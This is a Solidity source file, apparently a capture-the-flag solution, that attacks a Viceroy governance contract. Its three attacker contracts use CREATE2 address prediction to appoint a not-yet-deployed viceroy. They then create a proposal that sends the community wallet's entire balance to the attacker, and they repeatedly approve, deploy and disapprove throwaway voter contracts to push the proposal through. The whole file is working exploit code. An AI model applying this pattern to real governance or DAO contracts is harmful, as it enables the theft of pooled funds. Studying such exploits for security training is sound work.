// SPDX-License-Identifier: GPL-3.0
pragma solidity =0.8.19;

import {Governance} from "@main/Viceroy.sol";

contract GovernanceAttacker {
    address attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function attack(address _governance, address _communityWallet) external {
        // get initcode
        bytes memory bytecode = type(ViceroyAttacker).creationCode;
        // concat with parameter
        bytecode = abi.encodePacked(bytecode, abi.encode(_governance, attacker, _communityWallet));
        // hash & address using a  salt : uint(123)
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), uint256(123), keccak256(bytecode)));
        address deployedAddr = address(uint160(uint256(hash)));
        Governance(_governance).appointViceroy(deployedAddr, 1);
        // deploy or viceroy contract with predicted address
        new ViceroyAttacker{salt: bytes32(uint(123))}(
            _governance,
            attacker,
            _communityWallet
        );
    }
}

contract ViceroyAttacker {
    Governance governance;
    uint256 attackCounter = 1;

    constructor(address _governance, address _attacker, address _communityWallet) {
        governance = Governance(_governance);
        uint256 value = _communityWallet.balance;
        // malicious call data which will transfer all funds to the attacker
        bytes memory data = abi.encodeWithSignature(
            "exec(address,bytes,uint256)",
            _attacker,
            "0x", // not needed to transfer balance
            value
        );
        // since this contract is the viceroy we cann create a proposal
        governance.createProposal(_attacker, data);
        uint256 proposalId = uint256(keccak256(data));
        // loop 10 times
        while (attackCounter < 11) {
            // get bytecode
            bytes memory bytecode = type(VoterAttacker).creationCode;
            bytecode = abi.encodePacked(bytecode, abi.encode(_governance, proposalId, address(this)));

            // rlp
            // get hash & address
            //  keccak256( 0xff ++ senderAddress ++ salt ++ keccak256(init_code))

            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), attackCounter, keccak256(bytecode)));

            // bytes20 is capturing top (left) 20 bytes, while:
            // uint160 is capturing lowest (right) 20 bytes.

            address deployedAddr = address(uint160(uint256(hash)));
            governance.approveVoter(deployedAddr);
            new VoterAttacker{salt: bytes32(attackCounter)}(
                _governance,
                proposalId,
                address(this)
            );
            governance.disapproveVoter(deployedAddr);
            attackCounter++;
        }
        governance.executeProposal(proposalId);
    }
}

contract VoterAttacker {
    Governance governance;

    constructor(address _governance, uint256 proposalId, address _viceroy) {
        governance = Governance(_governance);
        bool inFavor = true;
        governance.voteOnProposal(proposalId, inFavor, _viceroy);
    }
}
